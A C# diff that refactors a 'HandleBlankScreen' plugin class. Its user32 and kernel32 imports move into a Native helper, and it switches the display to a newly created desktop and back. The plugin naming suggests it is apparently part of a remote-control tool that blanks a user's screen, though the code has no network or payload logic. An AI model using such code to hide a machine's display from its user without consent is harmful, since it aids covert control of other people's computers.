@@ -9,23 +9,6 @@ namespace Plugin.Handler
 {
     public class HandleBlankScreen
     {
-        [DllImport("user32.dll")]
-        public static extern IntPtr CreateDesktop(string lpszDesktop, IntPtr lpszDevice, IntPtr pDevmode, int dwFlags, uint dwDesiredAccess, IntPtr lpsa);
-
-        [DllImport("user32.dll")]
-        private static extern bool SwitchDesktop(IntPtr hDesktop);
-
-        [DllImport("user32.dll")]
-        public static extern bool CloseDesktop(IntPtr handle);
-
-        [DllImport("user32.dll")]
-        public static extern bool SetThreadDesktop(IntPtr hDesktop);
-
-        [DllImport("user32.dll")]
-        public static extern IntPtr GetThreadDesktop(int dwThreadId);
-
-        [DllImport("kernel32.dll")]
-        public static extern int GetCurrentThreadId();
         enum DESKTOP_ACCESS : uint
         {
             DESKTOP_NONE = 0,
@@ -45,16 +28,16 @@ namespace Plugin.Handler
         }
 
         // old desktop's handle, obtained by getting the current desktop assigned for this thread
-        public readonly IntPtr hOldDesktop = GetThreadDesktop(GetCurrentThreadId());
+        public readonly IntPtr hOldDesktop = Native.GetThreadDesktop(Native.GetCurrentThreadId());
 
         // new desktop's handle, assigned automatically by CreateDesktop
-        public IntPtr hNewDesktop = CreateDesktop("RandomDesktopName", IntPtr.Zero, IntPtr.Zero, 0, (uint)DESKTOP_ACCESS.GENERIC_ALL, IntPtr.Zero);
+        public IntPtr hNewDesktop = Native.CreateDesktop("RandomDesktopName", IntPtr.Zero, IntPtr.Zero, 0, (uint)DESKTOP_ACCESS.GENERIC_ALL, IntPtr.Zero);
 
         public void Run()
         {
             try
             {
-                SwitchDesktop(hNewDesktop);
+                Native.SwitchDesktop(hNewDesktop);
             }
             catch { }
         }
@@ -63,7 +46,7 @@ namespace Plugin.Handler
         {
             try
             {
-                SwitchDesktop(hOldDesktop);
+                Native.SwitchDesktop(hOldDesktop);
             }
             catch { }
         }
